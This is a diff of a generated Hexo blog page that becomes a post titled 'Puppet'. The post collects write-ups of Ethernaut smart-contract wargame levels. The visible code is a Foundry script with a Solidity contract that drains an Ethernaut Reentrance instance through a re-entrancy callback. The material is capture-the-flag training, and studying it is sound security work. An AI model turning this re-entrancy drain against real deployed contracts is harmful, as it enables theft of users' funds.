@@ -20,22 +20,41 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"avatar":{"url":"/images/avatar.png","rounded":true,"rotated":false}},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac","show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":{"header":true,"content":true}},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+    <meta name="description" content="资料库 解构Solidity Contract  合约升级,TPP、UUPS  Alchemy关于Web3的基础  What is Smart Contract Storage Layout?  关于Solidity类型转换  ETH开发文档   FallBack1234567891011121314151617181920212223242526272829303132333435363738&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Puppet">
+<meta property="og:url" content="http://example.com/2026/01/27/ethernautP1/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="资料库 解构Solidity Contract  合约升级,TPP、UUPS  Alchemy关于Web3的基础  What is Smart Contract Storage Layout?  关于Solidity类型转换  ETH开发文档   FallBack1234567891011121314151617181920212223242526272829303132333435363738&#x2F;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202601271822617.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202511111517566.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501291650177.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202501302240301.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502141627902.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502141642069.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502142118169.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502151428199.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502171708168.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502182234724.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502171711834.png">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502182234442.png">
+<meta property="article:published_time" content="2026-01-27T09:35:13.000Z">
+<meta property="article:modified_time" content="2026-01-27T10:22:39.249Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Ethernaut">
+<meta property="article:tag" content="Web3 Security">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202601271822617.png">
 
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2026/01/27/ethernautP1/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/01/27/ethernautP1/","path":"2026/01/27/ethernautP1/","title":"Puppet"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Hexo</title>
+<title>Puppet | Hexo</title>
   
 
 
@@ -87,7 +106,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">Hexo</h1>
+      <p class="site-title">Hexo</p>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -140,7 +159,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -153,6 +172,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%84%E6%96%99%E5%BA%93"><span class="nav-number">1.</span> <span class="nav-text">资料库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FallBack"><span class="nav-number">2.</span> <span class="nav-text">FallBack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">Exp：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FallOut"><span class="nav-number">3.</span> <span class="nav-text">FallOut</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp"><span class="nav-number">3.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Coin-Filp"><span class="nav-number">4.</span> <span class="nav-text">Coin Filp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-1"><span class="nav-number">4.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telephone"><span class="nav-number">5.</span> <span class="nav-text">Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="nav-number">5.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-2"><span class="nav-number">5.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Token"><span class="nav-number">6.</span> <span class="nav-text">Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="nav-number">6.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-3"><span class="nav-number">6.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Delegation"><span class="nav-number">7.</span> <span class="nav-text">Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-5"><span class="nav-number">7.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-4"><span class="nav-number">7.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Force"><span class="nav-number">8.</span> <span class="nav-text">Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-6"><span class="nav-number">8.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-5"><span class="nav-number">8.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vault"><span class="nav-number">9.</span> <span class="nav-text">Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-7"><span class="nav-number">9.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-6"><span class="nav-number">9.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#King"><span class="nav-number">10.</span> <span class="nav-text">King</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-8"><span class="nav-number">10.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-7"><span class="nav-number">10.2.</span> <span class="nav-text">Exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-entrancy"><span class="nav-number">11.</span> <span class="nav-text">Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-9"><span class="nav-number">11.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exp-8"><span class="nav-number">11.2.</span> <span class="nav-text">Exp</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -203,16 +223,17 @@
 
     </div>
 
-    <div class="main-inner index posts-expand">
+    <div class="main-inner post posts-expand">
 
-    
+
+  
 
 
 <div class="post-block">
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/27/ethernautP1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -226,13 +247,13 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="name" content="Puppet | Hexo">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/01/27/ethernautP1/" class="post-title-link" itemprop="url">Puppet</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Puppet
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -263,8 +284,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="资料库"><a href="#资料库" class="headerlink" title="资料库"></a>资料库</h2><ul>
+    <div class="post-body" itemprop="articleBody"><h2 id="资料库"><a href="#资料库" class="headerlink" title="资料库"></a>资料库</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.openzeppelin.com/news/deconstructing-a-solidity-smart-contract-part-i-introduction-832efd2d7737">解构Solidity Contract</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://medium.com/@tanner.dev/%E5%8E%9F%E4%BE%86%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E5%8F%AF%E4%BB%A5%E5%8D%87%E7%B4%9A-%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82-contract-proxy-pattern-%E7%9A%84-tpp-uups-dcc4ccbe4f16">合约升级,TPP、UUPS</a></p>
@@ -449,7 +469,6 @@
 <p>不用部署的Exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">interface IReentrance &#123;</span><br><span class="line">    function donate(address) external payable;</span><br><span class="line">    function withdraw(uint256) external;</span><br><span class="line">    function balanceOf(address) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancySolution is Script &#123;</span><br><span class="line">    Reentrance re = Reentrance(0xE1280DB04f7C397BaBd478CA0EFc0f9293eE0927);</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        ReEntrancyAttack attack = new ReEntrancyAttack&#123;value: 0.001 ether&#125;(address(re));</span><br><span class="line">        attack.attack();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">    IReentrance private immutable target;</span><br><span class="line"></span><br><span class="line">    constructor(address _instanceAddress) public payable &#123;</span><br><span class="line">        target = IReentrance(_instanceAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        uint256 balance = target.balanceOf(address(this));</span><br><span class="line">        if (balance &gt; 0) &#123;</span><br><span class="line">            target.withdraw(balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
@@ -457,11 +476,34 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>John Doe
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2026/01/27/ethernautP1/" title="Puppet">http://example.com/2026/01/27/ethernautP1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web3-Security/" rel="tag"># Web3 Security</a>
+              <a href="/tags/Ethernaut/" rel="tag"># Ethernaut</a>
+          </div>
+
+        
+
     </footer>
   </article>
 </div>
+
 
 
 
